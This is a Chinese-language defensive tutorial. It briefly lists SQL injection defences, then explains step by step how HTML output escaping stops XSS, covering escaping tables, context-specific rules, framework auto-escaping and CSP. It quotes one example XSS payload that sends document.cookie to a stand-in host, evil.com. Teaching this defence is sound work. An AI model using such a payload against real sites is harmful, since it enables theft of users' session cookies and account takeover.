    # SQL Injection 防禦方式
    
    1. **使用參數化查詢（Prepared Statements）**
       這是最有效的防禦方法。將 SQL 語法與使用者輸入的資料分離，讓資料庫將輸入視為「值」而非「可執行指令」，從根本上杜絕惡意語法被執行。

       對所有使用者輸入進行嚴格檢查，採用白名單方式只允許預期的格式（如數字、特定字元），並對特殊字元進行跳脫（escaping）處理。

    # 為什麼網頁要對輸出做 HTML 跳脫來防止 XSS
    
    讓我一步步推導這個完整的思考過程。
    
    ## 第一步：瀏覽器如何看待一段文字？
    
    當瀏覽器收到 HTML 時，它不會把內容單純當成「文字」顯示，而是當成**程式碼來解析**。它會尋找特殊字元來判斷結構：
    
    - `<` 代表「一個標籤要開始了」
    - `>` 代表「標籤結束」
    - `&` 代表「一個實體（entity）要開始了」
    - `"` 和 `'` 代表「屬性值的邊界」
    
    **關鍵認知**：對瀏覽器而言，這些字元是「語法」，不是「資料」。
    
    ## 第二步：問題出在哪裡？
    
    網頁常常要顯示**使用者提供的資料**，例如留言、暱稱、搜尋關鍵字。開發者的本意是：
    
    > 「把使用者打的字，當成純文字顯示出來。」
    
    但如果直接把使用者輸入塞進 HTML：
    
    ```html
    <div>使用者留言：這裡放使用者輸入</div>
    ```
    
    瀏覽器並不知道「這段是資料、不該當程式碼」。它只會照著語法規則解析。
    
    ## 第三步：攻擊者如何利用這個落差？
    
    假設使用者在留言框輸入的不是普通文字，而是：
    
    ```html
    <script>fetch('https://evil.com?c='+document.cookie)</script>
    ```
    
    直接拼進網頁後，瀏覽器看到 `<script>`，心想「喔，這是程式碼標籤」，於是**執行了它**。
    
    結果：攻擊者的 JavaScript 在受害者的瀏覽器、在你的網站網域下執行，可以偷 Cookie、冒充使用者、竄改頁面。這就是 **XSS（跨站腳本攻擊）**。
    
    **根本原因**：資料與程式碼混在同一個通道（HTML），而瀏覽器用語法字元來區分兩者。
    
    ## 第四步：HTML 跳脫如何解決？
    
    跳脫（escaping）就是把那些「語法字元」換成對應的**實體編碼**：
    
    | 原字元 | 跳脫後 |
    |--------|--------|
    | `<`    | `&lt;` |
    | `>`    | `&gt;` |
    | `&`    | `&amp;` |
    | `"`    | `&quot;` |
    | `'`    | `&#39;` |
    
    跳脫後，上面的攻擊字串變成：
    
    ```
    &lt;script&gt;fetch(...)&lt;/script&gt;
    ```
    
    現在瀏覽器解析時，看到的是 `&lt;` 這個實體，它知道「這代表要**顯示**一個小於符號」，而不是「一個標籤的開始」。
    
    **效果**：這段內容被當成純文字顯示在畫面上（使用者會看到 `<script>` 這幾個字），而不會被執行。
    
    ## 第五步：為什麼這招有效的本質
    
    跳脫的本質是：
    
    > 在把資料交給瀏覽器之前，**明確告訴瀏覽器「這一段是資料，不是語法」**，方法就是把會被誤認為語法的字元，改寫成語義上等價、但不觸發解析的形式。
    
    這樣就重新建立了「資料」與「程式碼」之間被破壞的界線。
    
    ## 補充：關鍵觀念
    
    1. **要在「輸出時」跳脫，而非只在輸入時**
       同一份資料可能輸出到不同情境（HTML 內文、屬性、JS、URL）。各情境語法不同，需要的跳脫方式也不同。輸出時才能知道正確的情境。
    
    2. **情境決定跳脫規則**
       - 放進 HTML 內文 → HTML 跳脫
       - 放進屬性值 → HTML 屬性跳脫（務必加引號）
       - 放進 `<script>` 內 → JavaScript 跳脫
       - 放進 URL → URL 編碼
    
    3. **實務上優先用框架內建機制**
       React（`{}` 自動跳脫）、Vue、各種樣板引擎（如 Jinja2、ERB）大多預設自動跳脫，比手動處理更不易出錯。另可搭配 CSP（內容安全政策）作為縱深防禦。
    
    ---
    
    **一句話總結**：XSS 的根源是「瀏覽器用特殊字元區分資料與程式碼」，HTML 跳脫就是把這些特殊字元改寫成不會觸發解析的實體，讓使用者資料被當成「純文字顯示」而非「被執行的程式碼」。
